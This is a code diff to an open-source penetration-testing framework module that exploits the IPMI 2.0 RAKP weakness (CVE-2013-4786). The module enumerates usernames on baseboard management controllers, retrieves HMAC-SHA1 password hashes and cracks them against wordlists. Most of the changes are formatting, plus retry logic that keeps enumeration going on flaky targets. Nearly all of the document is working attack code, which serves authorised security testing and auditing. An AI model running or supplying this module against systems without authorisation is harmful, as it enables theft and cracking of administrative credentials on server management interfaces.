@@ -9,42 +9,43 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval',
+      'Name' => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval',
       'Description' => %q|
         This module identifies IPMI 2.0-compatible systems and attempts to retrieve the
         HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a
         file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb
         in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.
         |,
-      'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          ['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html'],
-          ['URL', 'https://seclists.org/bugtraq/2014/Apr/16'], # HP's SSRT101367
-          ['CVE', '2013-4786'],
-          ['OSVDB', '95057'],
-          ['BID', '61076'],
-        ],
-      'DisclosureDate' => 'Jun 20 2013'
+      'Author' => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html'],
+        ['URL', 'https://seclists.org/bugtraq/2014/Apr/16'], # HP's SSRT101367
+        ['CVE', '2013-4786'],
+        ['OSVDB', '95057'],
+        ['BID', '61076'],
+      ],
+      'DisclosureDate' => '2013-06-20'
     )
 
     register_options(
-    [
-      Opt::RPORT(623),
-      OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
-        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
-      ]),
-      OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
-        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
-      ]),
-      OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
-      OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
-      OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true]),
-      OptInt.new('SESSION_RETRY_DELAY', [true, "Delay between session retries in seconds", 5]),
-      OptInt.new('SESSION_MAX_ATTEMPTS', [true, "Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)", 5])
-    ])
-
+      [
+        Opt::RPORT(623),
+        OptPath.new('USER_FILE', [
+          true, "File containing usernames, one per line",
+          File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
+        ]),
+        OptPath.new('PASS_FILE', [
+          true, "File containing common passwords for offline cracking, one per line",
+          File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
+        ]),
+        OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
+        OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
+        OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true]),
+        OptInt.new('SESSION_RETRY_DELAY', [true, "Delay between session retries in seconds", 5]),
+        OptInt.new('SESSION_MAX_ATTEMPTS', [true, "Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)", 5])
+      ]
+    )
   end
 
   def post_auth?
@@ -52,19 +53,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def ipmi_status(msg)
-    vprint_status("#{rhost}:#{rport} - IPMI - #{msg}")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - IPMI - #{msg}")
   end
 
   def ipmi_error(msg)
-    vprint_error("#{rhost}:#{rport} - IPMI - #{msg}")
+    vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - IPMI - #{msg}")
   end
 
   def ipmi_good(msg)
-    print_good("#{rhost}:#{rport} - IPMI - #{msg}")
+    print_good("#{Rex::Socket.to_authority(rhost, rport)} - IPMI - #{msg}")
   end
 
   def run_host(ip)
-
     ipmi_status("Sending IPMI probes")
 
     usernames = []
@@ -91,15 +91,17 @@ class MetasploitModule < Msf::Auxiliary
     delay_value = datastore['SESSION_RETRY_DELAY'].to_i
     max_session_attempts = datastore['SESSION_MAX_ATTEMPTS'].to_i
 
-    self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
+    self.udp_sock = Rex::Socket::Udp.create({ 'Context' => { 'Msf' => framework, 'MsfExploit' => self } })
     add_socket(self.udp_sock)
 
     reported_vuln = false
     session_succeeded = false
+    seen_valid_open_session = false
+    stop_username_enumeration = false
 
     usernames.each do |username|
       console_session_id = Rex::Text.rand_text(4)
-      console_random_id  = Rex::Text.rand_text(16)
+      console_random_id = Rex::Text.rand_text(16)
 
       ipmi_status("Trying username '#{username}'...")
 
@@ -109,7 +111,6 @@ class MetasploitModule < Msf::Auxiliary
 
       # It may take multiple tries to get a working "session" on certain BMCs (HP iLO 4, etc)
       1.upto(max_session_attempts) do |attempt|
-
         r = nil
         1.upto(3) do
           udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
@@ -118,7 +119,15 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         unless r
-          ipmi_status("No response to IPMI open session request")
+          if seen_valid_open_session
+            # Target has previously responded to an open session request, so treat
+            # this non-response as transient (rate limiting, session exhaustion, etc.)
+            # rather than aborting so we don't miss hashes on a flaky target.
+            ipmi_status("No response to IPMI open session request for username #{username}")
+          else
+            ipmi_error("No response to IPMI open session request; stopping username enumeration")
+            stop_username_enumeration = true
+          end
           rakp = nil
           break
         end
@@ -138,6 +147,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         session_succeeded = true
+        seen_valid_open_session = true
 
         sess_data = Rex::Proto::IPMI::Session_Data.new.read(sess.data)
 
@@ -149,7 +159,12 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         unless r
-          ipmi_status("No response to RAKP1 message")
+          if seen_valid_open_session
+            ipmi_status("No response to RAKP1 message for username #{username}")
+          else
+            ipmi_error("No response to RAKP1 message; stopping username enumeration")
+            stop_username_enumeration = true
+          end
           next
         end
 
@@ -190,6 +205,8 @@ class MetasploitModule < Msf::Auxiliary
         break
       end
 
+      break if stop_username_enumeration
+
       # Skip to the next user if we didnt get a valid response
       next if !rakp
 
@@ -223,13 +240,13 @@ class MetasploitModule < Msf::Auxiliary
       # Write the vulnerability to the database
       unless reported_vuln
         report_vuln(
-          :host  => rhost,
-          :port  => rport,
+          :host => rhost,
+          :port => rport,
           :proto => 'udp',
           :sname => 'ipmi',
-          :name  => 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',
-          :info  => "Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}",
-          :refs  => self.references
+          :name => 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',
+          :info => "Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}",
+          :refs => self.references
         )
         reported_vuln = true
       end
@@ -241,6 +258,7 @@ class MetasploitModule < Msf::Auxiliary
         pass = pass.strip
         next unless pass.length > 0
         next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp_data.hmac_sha1, pass)
+
         ipmi_good("Hash for user '#{username}' matches password '#{pass}'")
 
         # Report the clear-text credential to the database
@@ -254,6 +272,7 @@ class MetasploitModule < Msf::Auxiliary
     shost = shost.sub(/^::ffff:/, '')
     info = Rex::Proto::IPMI::Open_Session_Reply.new.read(data) rescue nil
     return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
+
     info
   end
 
@@ -261,9 +280,9 @@ class MetasploitModule < Msf::Auxiliary
     shost = shost.sub(/^::ffff:/, '')
     info = Rex::Proto::IPMI::RAKP2.new.read(data) rescue nil
     return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
+
     info
   end
-
 
   def write_output_files(rhost, username, sha1_salt, sha1_hash)
     if datastore['OUTPUT_HASHCAT_FILE']
@@ -336,8 +355,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def udp_recv(timeo)
-    r = udp_sock.recvfrom(65535, timeo)
-    r[1] ? r : nil
+    r = udp_sock.timed_recvfrom(65535, timeo)
+    return nil unless r
+
+    [r[0], r[1][3], r[1][1]]
   end
 
   def rhost
